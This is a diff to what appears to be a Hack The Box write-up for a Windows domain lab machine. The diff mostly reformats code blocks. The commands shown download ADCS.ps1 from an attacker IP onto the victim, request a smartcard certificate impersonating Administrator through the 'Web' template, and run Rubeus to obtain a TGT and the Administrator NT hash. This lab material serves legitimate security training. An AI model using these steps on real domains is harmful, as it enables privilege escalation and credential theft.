@@ -549,10 +549,8 @@ CA Name: earth.windcorp.htb\windcorp-CA
 ```
 In order to exploit the machine, we'll execute rubeus.exe on this following scenario:
 ```bash
-Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new proc
-ess/logon session:
-        Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/n
-owrap]
+Retrieve a TGT using a certificate from the users keystore (Smartcard) specifying certificate thumbprint or subject, start a /netonly process, and to apply the ticket to the new process/logon session:
+        Rubeus.exe asktgt /user:USER /certificate:f063e6f4798af085946be6cd9d82ba3999c7ebac /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap]
 ```
 But in order to create a certificate, we'll need to use the [ADCS.ps1](https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1) script, keep in mind that there is a certificate template that we extracted with certify.exe called "Web". Moreover, ADCS.ps1 works only if we download also [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) :
 1) Let's upload the PowerView.ps1 to the victim machine and load it:
@@ -605,14 +603,14 @@ else {
 }
 ```
 4) Then we transfer the file and import the module on different steps because the module cannot be uploaded and loaded on the same step as the previous one:
-```bash
+```powershell
 # First download it:
 PS C:\Windows\Temp\PrivEsc> curl 10.10.14.2/ADCS.ps1 -o ADCS.ps1
 # Then load it:
 PS C:\Windows\Temp\PrivEsc> Import-Module .\ADCS.ps1
 ```
 5) Generate a SmartCard certificate with the information that we already have, impersonating the administrator, let's understand the module ADCS.ps1:
-```bash
+```powershell
 # This is the function that we'll load from powershell:
 function Get-SmartcardCertificate
 # Then we need to provide the parameters that the function requests:
@@ -628,11 +626,11 @@ Instructs the script to use the default CSP during enrollment. This will result 
 Use this if you have no smartcard or just want a PoC.
 ```
 6) Our payload will be as follows:
-```bash
+```powershell
 PS C:\Windows\Temp\PrivEsc> Get-SmartcardCertificate -Identity Administrator -TemplateName WEB -NoSmartcard -Verbose
 ```
 7) We can check the certificates generated with the following command: ^3fe8c0
-```bash
+```powershell
 gci cert:\currentuser\my -verbose
    PSParentPath: Microsoft.PowerShell.Security\Certificate::currentuser\my
 
@@ -641,7 +639,7 @@ Thumbprint                                Subject
 95E99117088DD7F691848064CC95E3F4E03E2C9C
 ```
 8) Then we can get an NT hash with rubeus using the SmartCard functionality:
-```bash
+```powershell
 PS C:\Windows\Temp\PrivEsc> .\Rubeus.exe asktgt /user:Administrator /certificate:95E99117088DD7F691848064CC95E3F4E03E2C9C /getcredentials
 
    ______        _
